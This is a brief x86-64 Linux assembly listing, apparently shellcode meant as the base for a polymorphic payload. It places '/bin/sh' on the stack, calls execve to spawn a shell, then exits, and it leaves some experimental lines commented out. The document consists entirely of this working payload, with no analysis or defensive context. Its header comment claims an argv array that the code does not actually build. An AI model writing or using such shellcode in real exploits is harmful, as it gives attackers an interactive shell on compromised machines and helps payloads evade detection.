
; [Linux/X86-64]
; Dummy for polymorphic shellcode:
; execve("/bin/sh", ["/bin/sh"], NULL)
_start:
    xor   rsi, rsi
    mul   rsi
    mov  r9, 0x68732f6e69622fff
    shr r9, 0x8
    mov [rsp-0x8], r9
    lea   rdi, [rsp-8]
    ;sub rsp, 0x8   ; real top mof stack - points to rdi same address
    ;push   rdx
    ;mov [rsp-8], rdi
    ;sub rsp, 0x10
    ;lea  rsi, [rsp+0x8]
    add al, 0x3b   ; execve(3b)
    syscall
    push  0x1
    pop rdi
    push  0x3c     ; exit(3c)
    pop rax
    syscall

